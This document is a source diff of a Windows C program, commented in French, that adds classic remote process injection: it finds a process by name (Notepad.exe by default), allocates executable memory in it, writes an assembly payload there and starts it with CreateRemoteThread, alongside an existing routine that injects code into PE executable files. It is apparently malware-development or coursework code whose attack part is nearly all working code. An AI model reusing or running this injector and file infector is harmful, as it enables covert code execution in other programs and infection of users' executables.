@@ -9,8 +9,36 @@
 
 #include <windows.h>
 #include <stdio.h>
+#include <tlhelp32.h>
 #pragma comment(lib, "user32.lib")
 
+//fonction pour trouver le PID d'un process avec son nom 
+DWORD FindProcessID(const char *processName) {
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) {
+        fprintf(stderr, "Failed to create snapshot\n");
+        return 0;
+    }
+
+    PROCESSENTRY32 pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+
+    if (!Process32First(hSnapshot, &pe32)) {
+        fprintf(stderr, "Failed to get first process\n");
+        CloseHandle(hSnapshot);
+        return 0;
+    }
+
+    do {
+        if (strstr(pe32.szExeFile, processName) != NULL) {
+            CloseHandle(hSnapshot);
+            return pe32.th32ProcessID;
+        }
+    } while (Process32Next(hSnapshot, &pe32));
+
+    CloseHandle(hSnapshot);
+    return 0;
+}
 
  // Fonction pour copier de la mémoire
 void my_memcpy(PUCHAR dst, PUCHAR src, DWORD len)
@@ -21,13 +49,10 @@ void my_memcpy(PUCHAR dst, PUCHAR src, DWORD len)
 
 int inject_pe(char* filename)
 {
-    
     if (filename == NULL) {
         fprintf(stderr, "Filename is NULL\n");
         return 1;
     }
-    printf("Injecting %s \n", filename);
-
     // Pointeurs externes au code en assembleur à injecter
     extern void payload(); // Point d'entrée du code assembleur
     extern char __begin_of_code; // Début du code assembleur
@@ -175,8 +200,94 @@ int inject_pe(char* filename)
     return 0;
 }
 
+int inject_process(const char *processName)
+{
+   // Pointeurs externes au code en assembleur à injecter
+    extern void payload(); // Point d'entrée du code assembleur
+    extern char __begin_of_code; // Début du code assembleur
+    extern ULONGLONG __end_of_code; // Fin du code assembleur
+
+    // Calcul du nombre de bytes à ajouter (différence entre la fin et le début du code ASM) + 1 ULONGLONG
+    DWORD nb_add = ((PUCHAR)&__end_of_code - (PUCHAR)&__begin_of_code) + sizeof(ULONGLONG);
+
+    // Obtention des droits de lecture/écriture pour modifier la section de code
+    DWORD old_protect;
+    VirtualProtect(&__end_of_code, sizeof(__end_of_code), PAGE_READWRITE, &old_protect);
+
+    // Mise à jour de la taille du code
+    __end_of_code = nb_add;
+
+    DWORD pid = FindProcessID(processName);
+    if (pid == 0) {
+        printf("Process %s not found\n", processName);
+        return 1;
+    }
+
+
+    printf("PID of %s is %lu\n", processName, pid);
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (hProcess == NULL) {
+        printf("Failed to open process\n");
+        return 1;
+    }
+
+    printf("Opened process\n");
+
+    // Allocation de mémoire pour le processus distant
+    PVOID rb = VirtualAllocEx(hProcess, NULL, nb_add, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (rb == NULL) {
+        printf("Failed to allocate memory in remote process\n");
+        CloseHandle(hProcess);
+        return 1;
+    }
+
+    printf("%u bytes allocated in remote memory process at %p\n",nb_add, rb);
+
+    // Calcul de l'offset vers le code C injecté
+    extern LONGLONG to_c_code;
+    extern void inj_code_c();
+    to_c_code = (PUCHAR)inj_code_c - &__begin_of_code;
+
+    // Écriture du payload dans le processus distant
+    if (!WriteProcessMemory(hProcess, rb, (PUCHAR)payload, nb_add, NULL)) {
+        printf("Failed to write to remote process memory\n");
+        VirtualFreeEx(hProcess, rb, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return 1;
+    }
+
+    printf("Wrote payload to remote process memory\n");
+
+    // Création d'un thread dans le processus distant pour exécuter le payload
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
+    if (hThread == NULL) {
+        printf("Failed to create remote thread\n");
+        VirtualFreeEx(hProcess, rb, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return 1;
+    }
+
+    DWORD dwThreadId = GetThreadId(hThread);
+
+    printf("Created remote thread with ID %lu\n", dwThreadId);
+
+    CloseHandle(hProcess);
+
+    printf("Process %s injected successfully\n", processName );
+
+    return 0;
+}
+
 int main(int ac, char **av)
 {
+
+    if (ac > 1){
+        inject_process(av[1]);
+    }else{
+        inject_process("Notepad.exe");
+    }
+
     WIN32_FIND_DATA findFileData;
     HANDLE hFind = INVALID_HANDLE_VALUE;
     char pattern[MAX_PATH];
